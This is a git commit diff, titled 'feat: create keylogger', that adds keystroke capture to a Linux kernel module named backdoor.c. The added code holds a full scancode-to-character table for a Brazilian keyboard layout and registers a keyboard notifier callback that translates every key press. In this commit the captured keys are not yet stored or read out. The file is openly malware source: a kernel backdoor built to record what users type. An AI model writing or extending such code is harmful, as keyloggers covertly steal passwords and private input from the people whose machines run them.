5f6491a5f1d6538ad7864f1ba4281426e7bc7470
MichelH4cker <michel.hecker@usp.br>
2023-06-24 11:35:47 -0300

    feat: create keylogger

--- backdoor.c
+++ backdoor.c
@@ -3,6 +3,52 @@
 #include <linux/kernel.h>
 #include <linux/debugfs.h>
 #include <linux/stat.h>
+#include <linux/keyboard.h>
+#include <linux/input.h>
+
+#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
+
+/*
+ * Keymap references:
+ * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
+ * http://www.quadibloc.com/comp/scan.htm
+ * http://kbdlayout.info/KBDBR/virtualkeys+scancodes?arrangement=ABNT
+ */
+static const char *dictionary[][2] = {
+	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
+	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
+	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
+	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
+	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
+	{"o", "O"}, {"p", "P"}, {"'", "`"}, {"[", "{"},                 // 24-27
+	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
+	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
+	{"j", "J"}, {"k", "K"}, {"l", "L"}, {"ç", "Ç"},                 // 36-39
+	{"~", "^"}, {"'", "\""}, {"_LSHIFT_", "_LSHIFT_"}, {"]", "}"},  // 40-43
+	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
+	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
+	{".", ">"}, {";", ":"}, {"_RSHIFT_", "_RSHIFT_"}, {"*", "*"},   // 52-55
+	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},// 56-59
+	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
+	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
+	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70 
+	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
+	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
+	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
+	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
+	{"_KPD._", "_DEL_"}, {"_PRT_SC_", "_PRT_SC_"}, {"\0", "\0"},    // 83-85
+	{"\\", "|"}, {"F11", "F11"}, {"F12", "F12"}, {"/", "?"},		// 86-89
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 90-94
+	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, //95-98
+	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
+	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
+	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
+	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
+	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
+	{"_PAUSE_", "_PAUSE_"},
+};
 
 // Declarations 
 /**
@@ -10,6 +56,16 @@
  */
 static struct dentry *file;
 static struct dentry *subdir;
+
+static int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data);
+
+/**
+ * @brief notifier_call is given by my function
+ * 
+ */
+static struct notifier_block alarm_block = {
+	.notifier_call = keypress_callback, // configure the callback function 
+};
 
 /**
  * @brief change the way that the kernel will manage the file
@@ -19,6 +75,38 @@ const struct file_operations keys_fops = {
 	.owner = THIS_MODULE,
 	// . read = not created yet
 };
+
+void keycode_to_string(int keycode, int shift_is_pressed, char *buffer){
+	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
+		const char *key_translated = (shift_is_pressed == 1)
+			? dictionary[keycode][1]
+			: dictionary[keycode][0];
+		snprintf(buffer, CHUNK_LEN, "%s", key_translated);
+	}
+}
+
+/**
+ * @see https://docs.kernel.org/input/notifier.html
+ * @see https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566
+ * @brief called when a keypress event occurs. it's a callback function
+ * @param notifier it's the block itself 
+ * @param action a value indicating the type of event occurred.
+ * @param data a pointer that can be used to pass extra information about the event occurred. the Keyboard Notification Chain uses this pointer to pass all data related to the KEY pressed
+ * @return NOTIFY_OK indicate the status or result of a notification operation. it means successful 
+ */
+int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data){
+	char key_buffer[CHUNK_LEN] = {0}; // it will storage the translated keycode 
+	struct keyboard_notifier_param *param = data;
+
+	// EXIT IF KEY IS NOT PRESSED
+	if (param->down != 0x1)
+		return NOTIFY_OK;
+	
+	// CONVERT KEYCODE TO READABLE
+	keycode_to_string(param->value, param->shift, key_buffer);
+
+	return NOTIFY_OK;
+}
 
 static int __init backdoor_init(void){    
     printk(KERN_INFO "[+] Backdoor Initialized\n");
@@ -42,12 +130,23 @@ static int __init backdoor_init(void){
 		return -ENOENT;
 	}
 
+	// KEYBOARD EVENT
+	/**
+	 * @brief Construct a new register keyboard notifier object that will call the function keypress_callback when a keypress event occurs
+	 */
+	register_keyboard_notifier(&alarm_block);
 
     return 0;
 }
 
+/**
+ * @brief when the module stop, this function will be activated
+ * unregister the notification keybaord block 
+ * clean debufs directory
+ */
 static void __exit backdoor_exit(void){
     printk(KERN_INFO "[-] Backdoor Finished\n");
+	unregister_keyboard_notifier(&alarm_block);
     debugfs_remove_recursive(subdir);
 }
 
